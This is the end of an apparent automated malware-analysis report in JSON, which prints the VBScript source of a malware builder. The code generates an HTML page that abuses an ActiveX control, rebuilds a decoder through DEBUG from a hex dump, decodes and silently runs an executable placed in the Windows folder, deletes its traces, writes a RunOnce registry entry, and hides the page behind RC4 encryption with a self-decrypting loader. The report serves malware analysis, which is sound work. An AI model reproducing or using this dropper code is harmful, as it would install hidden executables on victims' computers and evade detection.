            "html(6) = \"cl=\"\"{06290BD5-48AA-11D2-8432-006008C3FBFC}\"\";\"",
            "html(7) = \"a1.setCLSID(cl);\"",
            "html(8) = \"a1.createInstance();\"",
            "html(9) = \"setTimeout(\"\"a1.setProperty('Path','\"\"+fn+\"\"')\"\",\" & setTimeout1 & \");\"",
            "html(10) = \"setTimeout(\"\"a1.setProperty('DOC',doc)\"\",\" & setTimeout2 & \");\"",
            "html(11) = \"setTimeout(\"\"a1.invoke('write',VA)\"\",\" & setTimeout3 & \");}\"",
            "html(12) = \"</SCRIPT><SCRIPT language=VBSCRIPT>\"",
            "html(13) = \"Option Explicit\"",
            "html(14) = \"Dim VA, doc\"",
            "html(15) = \"VA = ARRAY()\"",
            "HTML(16) = \"\"",
            "StartHtml = Join(html, vbNewline)",
            "End Function",
            "Function EncodeXXE()",
            "Dim Input, nline, nl, s, a",
            "Dim fLine1, fLine2, fLine",
            "Set input = fso.OpenTextFile(\"onz.xxe\", ForReading) ",
            "nLine = \" & vbNewline\"",
            "nl = \" & Chr(13) & Chr(10) & \"",
            "s = input.ReadLine",
            "fLine1 = \"set onzXxe=fso.CreateTextFile(\" & Chr(34) & Chr(34) & \"onz.xxe\" & Chr(34) & Chr(34) & \")\"\"\"",
            "fLine2 = \"\"\"onzXxe.WriteLine \" & Chr(34) & Chr(34) & s & Chr(34) & Chr(34)",
            "ReDim ca(-1)",
            "redim preserve ca(0)",
            "ca(0) = fLine1",
            "redim preserve ca(1)",
            "ca(1) = nl",
            "redim preserve ca(2)",
            "ca(2) = fLine2",
            "redim preserve ca(3)",
            "ca(3) = nLine",
            "a = 4",
            "Do While NOT input.AtEndOfStream",
            "ReDim preserve ca(a)",
            "s = input.ReadLine",
            "If s = \"\" Then",
            "ca(a) = nLine",
            "Else",
            "fLine = \" & \" & Chr(34) & Chr(34) & s & Chr(34) & Chr(34) ",
            "ca(a) = fLine & nLine",
            "End If",
            "a = a+1",
            "Loop",
            "ReDim preserve ca(a)",
            "ca(a) = Chr(34) & nl & \"\"\"onzXxe.close\"\"\" & nl & Chr(34)",
            "input.Close ",
            "EncodeXXE = Join(ca, \"\")",
            "End Function",
            "Function GenHtml()",
            "Dim nl, htmlEnd, htmlstart, f1",
            "nl = Chr(34) & \" & Chr(13) & Chr(10) & \" & Chr(34)",
            "Dim ar1(5), ar2(11), data(5)",
            "ar1(0) = \"Chr(13) & Chr(10) & \"\"<SCRIPT language=VBSCRIPT>\" & nl",
            "ar1(1) = \"Set fso = CreateObject(\"\"\"\"Scripting.FileSystemObject\"\"\"\")\" & nl",
            "ar1(2) = \"Set WshShell = CreateObject(\"\"\"\"WScript.Shell\"\"\"\")\" & nl",
            "ar1(3) = \"set xxDecSrc=fso.CreateTextFile(\"\"\"\"xxdecode.src\"\"\"\")\" & nl",
            "ar1(4) = \"xxDecSrc.WriteLine  \"\"\"\"n xxdecode.com\"\"\"\" & vbNewline & \"\"\"\"e 100 E9 A7 0 49 6E 70 75 74 20 66 69 6C 65 20 65 72 \"\"\"\" & vbNewline & \"\"\"\"e 110 72 6F 72 2E D A 4F 75 74 70 75 74 20 66 69 6C \"\"\"\" & vbNewline & \"\"\"\"e 120 65 20 65 72 72 6F 72 2E D A 73 74 61 72 74 20 \"\"\"\" & vbNewline & \"\"\"\"e 130 6E 6F 74 20 66 6F 75 6E 64 2E D A 45 6E 64 20 \"\"\"\" & vbNewline & \"\"\"\"e 140 6E 6F 74 20 66 6F 75 6E 64 2E D A 65 78 69 73 \"\"\"\" & vbNewline & \"\"\"\"e 150 74 73 2E 20 41 62 6F 72 74 69 6E 67 21 D A 0 \"\"\"\" & vbNewline & \"\"\"\"e 160 0 0 0 EA 3 EA 3 9A 3 0 2B 2D 30 31 32 33 \"\"\"\" & vbNewline & \"\"\"\"e 170 34 35 36 37 38 39 41 42 43 44 45 46 47 48 49 4A \"\"\"\" & vbNewline & \"\"\"\"e 180 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A \"\"\"\" & vbNewline & \"\"\"\"e 190 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 \"\"\"\" & vbNewline & \"\"\"\"e 1A0 71 72 73 74 75 76 77 78 79 7A E8 F0 1 E8 62 1 \"\"\"\" & vbNewline & \"\"\"\"e 1B0 BF 9A 3 E8 EF 0 AD 3D 62 65 75 F4 AD 3D 67 69 \"\"\"\" & vbNewline & \"\"\"\"e 1C0 75 EE AD 3D 6E 20 75 E8 BF 9A 3 AC 3A C4 76 FB \"\"\"\" & vbNewline & \"\"\"\"e 1D0 AC 3A C4 75 FB AC 3A C4 76 FB 3A C4 74 4 AA AC \"\"\"\" & vbNewline & \"\"\"\"e 1E0 EB F8 BA 9A 3 33 C9 88 D 80 3E 69 1 FF 74 20 \"\"\"\" & vbNewline & \"\"\"\"e 1F0 B4 4E CD 21 3C 2 74 18 3C 12 74 14 8B CF 2B CA \"\"\"\" & vbNewline & \"\"\"\"e 200 49 49 E8 3B 1 BA 4C 1 B9 13 0 B0 5 E9 24 1 \"\"\"\" & vbNewline & \"\"\"\"e 210 B4 3C CD 21 73 3 E9 F1 0 A3 61 1 BF 9A 3 E8 \"\"\"\" & vbNewline & \"\"\"\"e 220 83 0 8A 4 A C0 74 65 3C 2B 74 61 3C 20 74 5D \"\"\"\" & vbNewline & \"\"\"\"e 230 57 BB 6A 1 BA 40 0 56 AC A C0 74 12 8B FB 8B \"\"\"\" & vbNewline & \"\"\"\"e 240 CA F2 AE 75 45 8B C7 48 2B C3 88 44 FF EB E9 5E \"\"\"\" & vbNewline & \"\"\"\"e 250 5F AC 32 E4 8B E8 B9 4 6 AD 86 C4 8A D0 D0 E4 \"\"\"\" & vbNewline & \"\"\"\"e 260 D0 E4 D2 E8 A C4 AA 4D 74 B5 8A E2 AC 8A D0 D2 \"\"\"\" & vbNewline & \"\"\"\"e 270 E4 D0 E8 D0 E8 A C4 AA 4D 74 A4 8A E2 AC 8A CD \"\"\"\" & vbNewline & \"\"\"\"e 280 D2 E4 A C4 AA 4D 75 CE EB 95 E9 A1 0 E8 15 0 \"\"\"\" & vbNewline & \"\"\"\"e 290 AD 3D 65 6E 75 5 AC 3C 64 74 3 E8 9C 0 E8 51 \"\"\"\" & vbNewline & \"\"\"\"e 2A0 0 B4 4C CD 21 8B 36 63 1 89 3E 67 1 BD 43 0 \"\"\"\" & vbNewline & \"\"\"\"e 2B0 BF 4A 3 C6 5 0 3B 36 65 1 72 6 E8 33 0 E8 \"\"\"\" & vbNewline & \"\"\"\"e 2C0 50 0 AC 3C D 74 1B 3C A 74 18 AA 4D 75 E7 3B \"\"\"\" & vbNewline & \"\"\"\"e 2D0 36 65 1 72 3 E8 3A 0 AC 3C A 75 F2 BF 9A 3 \"\"\"\" & vbNewline & \"\"\"\"e 2E0 EB C7 46 C6 5 0 89 36 63 1 8B 3E 67 1 BE 4A \"\"\"\" & vbNewline & \"\"\"\"e 2F0 3 C3 BA 9A 3 8B CA 87 E 67 1 2B CA 76 A 8B \"\"\"\" & vbNewline & \"\"\"\"e 300 1E 61 1 B4 40 CD 21 72 1 C3 BA 16 1 B9 14 0 \"\"\"\" & vbNewline & \"\"\"\"e 310 EB 22 BA EA 3 B9 0 E1 8B 1E 5F 1 B4 3F CD 21 \"\"\"\" & vbNewline & \"\"\"\"e 320 72 C B C0 74 8 8B F2 3 C6 A3 65 1 C3 BA 3 \"\"\"\" & vbNewline & \"\"\"\"e 330 1 B9 13 0 E8 9 0 E9 67 FF BA 3C 1 B9 10 0 \"\"\"\" & vbNewline & \"\"\"\"e 340 50 BB 2 0 B4 40 CD 21 58 C3 54 68 69 73 20 70 \"\"\"\" & vbNewline & \"\"\"\"e 350 72 6F 67 72 61 6D 20 72 65 71 75 69 72 65 73 20 \"\"\"\" & vbNewline & \"\"\"\"e 360 44 4F 53 20 56 65 72 73 69 6F 6E 20 32 2E 30 20 \"\"\"\" & vbNewline & \"\"\"\"e 370 6F 72 20 68 69 67 68 65 72 2E D A 24 D A 49 \"\"\"\" & vbNewline & \"\"\"\"e 380 6E 70 75 74 20 70 61 74 68 2F 66 69 6C 65 3A 20 \"\"\"\" & vbNewline & \"\"\"\"e 390 20 4E 6F 20 61 63 74 69 6F 6E D A 24 B4 30 CD \"\"\"\" & vbNewline & \"\"\"\"e 3A0 21 3C 2 73 C BA 4A 3 B4 9 CD 21 B8 1 4C CD \"\"\"\" & vbNewline & \"\"\"\"e 3B0 21 E8 36 0 73 23 BA 7D 3 B9 14 0 BB 2 0 B4 \"\"\"\" & vbNewline & \"\"\"\"e 3C0 40 CD 21 BF 7F 0 C6 5 50 8B D7 B4 A CD 21 E8 \"\"\"\" & vbNewline & \"\"\"\"e 3D0 18 0 73 5 BA 91 3 EB CF BA 2C 4 B8 0 3D CD \"\"\"\" & vbNewline & \"\"\"\"e 3E0 21 72 4 A3 5F 1 C3 E9 44 FF BE 80 0 BF 2C 4 \"\"\"\" & vbNewline & \"\"\"\"e 3F0 FC AC A C0 74 2F B4 20 AC 3A C4 76 FB 3C 2F 74 \"\"\"\" & vbNewline & \"\"\"\"e 400 4 3C 2D 75 18 8B D0 8B 4 24 5F 3D 4F 20 8B C2 \"\"\"\" & vbNewline & \"\"\"\"e 410 75 B F6 16 69 1 46 46 AC 3A C4 76 A AA AC EB \"\"\"\" & vbNewline & \"\"\"\"e 420 F8 3A C4 76 2 F9 C3 C6 5 0 F8 C3 58 58 44 20 \"\"\"\" & vbNewline & \"\"\"\"e 430 76 31 2E 31 0 44 61 76 69 64 20 50 20 4B 69 72 \"\"\"\" & vbNewline & \"\"\"\"e 440 73 63 68 62 61 75 6D 2C 20 54 6F 61 64 20 48 61 \"\"\"\" & vbNewline & \"\"\"\"e 450 6C 6C 0 0 \"\"\"\" & vbNewline & \"\"\"\"rcx\"\"\"\" & vbNewline & \"\"\"\"353\"\"\"\" & vbNewline & \"\"\"\"w\"\"\"\" & vbNewline & \"\"\"\"q\"\"\"\" & vbNewline\" & nl",
            "ar1(5) = \"xxDecSrc.close\" & nl",
            "ar2(0) = \"WshShell.Run \"\"\"\"%comspec% /c debug < xxdecode.src\"\"\"\",0,True\" & nl",
            "ar2(1) = \"WshShell.Run \"\"\"\"%comspec% /c xxdecode.com onz.xxe\"\"\"\",0,True\" & nl",
            "ar2(2) = \"WshShell.Run \"\"\"\"%comspec% /c move onz.exe %windir%\\onz.exe\"\"\"\",0,True\" & nl",
            "ar2(3) = \"WshShell.Run \"\"\"\"%comspec% /c %windir%\\onz.exe\"\"\"\",0,False\" & nl",
            "ar2(4) = \"fso.DeleteFile \"\"\"\"xxdecode.src\"\"\"\", True\" & nl",
            "ar2(5) = \"fso.DeleteFile \"\"\"\"onz.xxe\"\"\"\", True\" & nl",
            "ar2(6) = \"fso.DeleteFile \"\"\"\"xxdecode.com\"\"\"\", True\" & nl",
            "ar2(7) = \"strStartup = WshShell.SpecialFolders(\"\"\"\"Startup\"\"\"\")\" & nl",
            "ar2(8) = \"sysCmd = WshShell.ExpandEnvironmentStrings(\"\"\"\"%COMSPEC%\"\"\"\")\" & nl",
            "ar2(9) = \"regCmd = sysCmd & \"\"\"\" /c del \"\"\"\" & Chr(34) & strStartup & \"\"\"\"\\ea.hta\"\"\"\" & Chr(34)\" & nl",
            "ar2(10) = \"WshShell.RegWrite \"\"\"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\clean\"\"\"\", regCmd\" & nl",
            "ar2(11) = \"<\"\" & Chr(47) & \"\"SCRIPT><BODY onload=\"\"\"\"javascript: window.close()\"\"\"\"><\"\" & Chr(47) & \"\"BODY>\"",
            "data(0) = StartHtml(timeout1, timeout2, timeout3)",
            "data(1) = \"doc = \" & Join(ar1, \"\")",
            "data(2) = EncodeXXE()",
            "data(3) = Join(ar2, \"\") & Chr(34)",
            "data(4) = vbNewline",
            "data(5) = \"</SCRIPT>\"",
            "GenHtml = Join(data, \"\")",
            "End Function",
            "Sub CryptHtml()",
            "Dim f1, f2, text, enc, eKey, html",
            "Set f1 = fso.OpenTextFile(\"godmessage.html\", ForReading)",
            "Set f2 = fso.CreateTextFile(\"Godmessage.HexEnc.html\", True)",
            "eKey = RandPwd()",
            "text = f1.ReadAll",
            "enc = EnCryptHex(text, eKey)",
            "html = WrapEnc(enc, eKey)",
            "f2.Write html",
            "f1.Close ",
            "f2.Close ",
            "End Sub",
            "Sub RC4Initialize(strPwd)",
            "Dim tempSwap, i, f, intLength ",
            "\tintLength = len(strPwd) ",
            "\tFor i = 0 To 255 ",
            "\t\tkey(i) = asc(mid(strPwd, (i mod intLength)+1, 1)) ",
            "\t\tstate(i) = i ",
            "\tNext",
            "f = 0",
            "For i = 0 To 255",
            "    f = (f + state(i) + key(i)) Mod 256",
            "    tempSwap = state(i)",
            "    state(i) = state(f)",
            "    state(f) = tempSwap",
            "Next",
            "End Sub",
            "Function EnCryptHex(plaintxt, psw)",
            "Dim temp, a, i, f, k, cipherby",
            "dim cipher()",
            "redim cipher(-1)",
            "i = 0",
            "f = 0",
            "RC4Initialize(psw)",
            "For a = 1 To Len(plaintxt)",
            "    i = (i + 1) Mod 256",
            "    f = (f + state(i)) Mod 256",
            "    temp = state(i)",
            "    state(i) = state(f)",
            "    state(f) = temp",
            "    k = (state(i) + state(f)) Mod 256",
            "    cipherby = Asc(Mid(plaintxt, a, 1)) Xor k",
            "\tIf cipherby = 0 then cipherby = Asc(Mid(plaintxt, a, 1))",
            "\tIf cipherby < 16 Then ",
            "\t\tcipherby = \"0\" & CStr(Hex(cipherby))",
            "\tElse",
            "\t\tcipherby = Hex(cipherby)",
            "\tEnd If",
            "\tredim preserve cipher(a-1)",
            "    cipher(a-1) = cipherby",
            "Next",
            "EnCryptHex = join( cipher, \"\")",
            "End Function",
            "Function RandPwd()",
            "Dim i, x",
            "ReDim pwdar(-1)",
            "Randomize",
            "For i = 0 To 31",
            "ReDim preserve pwdar(i)",
            "pwdar(i) = Chr(Int((122 - 42 + 1) * Rnd + 42))",
            "Next",
            "RandPwd = Join(pwdar, \"\")",
            "End Function",
            "Function WrapEnc(encText, encKey)",
            "Dim encHtml(48)",
            "encHtml(0) = \"Option Explicit\"",
            "encHtml(1) = \"Dim o, p, d, t, key(255), state(255)\"",
            "encHtml(2) = \"p = \"\"\" & encKey & Chr(34)",
            "encHtml(3) = \"d = \"\"\" & encText & Chr(34) & vbNewline",
            "encHtml(4) = \"o = DeCryptHex(d, p)\"",
            "encHtml(5) = \"t = setTimeout(\"\"go()\"\", 500)\"",
            "encHtml(6) = \"Sub go()\"",
            "encHtml(7) = \"Document.Write o\"",
            "encHtml(8) = \"Document.execCommand(\"\"Refresh\"\")\"",
            "encHtml(9) = \"End Sub\"",
            "encHtml(10) = \"Sub RC4Initialize(strPwd)\"",
            "encHtml(11) = \"Dim tempSwap, i, f, intLength\" ",
            "encHtml(12) = \"intLength = len(strPwd)\" ",
            "encHtml(13) = \"For i = 0 To 255\" ",
            "encHtml(14) = \"key(i) = asc(mid(strPwd, (i mod intLength)+1, 1))\" ",
            "encHtml(15) = \"state(i) = i\" ",
            "encHtml(16) = \"Next\"",
            "encHtml(17) = \"f = 0\"",
            "encHtml(18) = \"For i = 0 To 255\"",
            "encHtml(19) = \"f = (f + state(i) + key(i)) Mod 256\"",
            "encHtml(21) = \"tempSwap = state(i)\"",
            "encHtml(22) = \"state(i) = state(f)\"",
            "encHtml(23) = \"state(f) = tempSwap\"",
            "encHtml(24) = \"Next\"",
            "encHtml(25) = \"End Sub\"",
            "encHtml(26) = \"Function DeCryptHex(hextext, psw)\" ",
            "encHtml(27) = \"Dim temp, a, x, i, f, k, cipherby\"",
            "encHtml(28) = \"dim cipher()\"",
            "encHtml(29) = \"redim cipher(-1)\"",
            "encHtml(30) = \"x = 0\"",
            "encHtml(31) = \"i = 0\"",
            "encHtml(32) = \"f = 0\"",
            "encHtml(33) = \"Call RC4Initialize(psw)\"",
            "encHtml(34) = \"For a = 1 To Len(hextext) Step 2\"",
            "encHtml(35) = \"i = (i + 1) Mod 256\"",
            "encHtml(36) = \"f = (f + state(i)) Mod 256\"",
            "encHtml(37) = \"temp = state(i)\"",
            "encHtml(38) = \"state(i) = state(f)\"",
            "encHtml(39) = \"state(f) = temp\"",
            "encHtml(40) = \"k = (state(i) + state(f)) Mod 256\"",
            "encHtml(41) = \"cipherby = Asc(Chr(Eval(\"\"&H\"\" & Mid(hextext, a, 2)))) Xor k\"",
            "encHtml(42) = \"if cipherby = 0 then cipherby = Asc(Chr(Eval(\"\"&H\"\" & Mid(hextext, a, 2))))\" & vbNewline",
            "encHtml(43) = \"redim preserve cipher(x)\"",
            "encHtml(44) = \"cipher(x) = Chr(cipherby)\"",
            "encHtml(45) = \"x = x + 1\"",
            "encHtml(46) = \"Next\"",
            "encHtml(47) = \"DeCryptHex = join( cipher, \"\"\"\")\"",
            "encHtml(48) = \"End Function\"",
            "WrapEnc = \"<Script Language=VBScript>\" & vbNewLine & Join(encHtml, \" : \") & vbNewLine & \"</SCRIPT>\"",
            "End Function"
        ],
        "file": {
            "' - See Readme.txt": "Text"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.390455",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
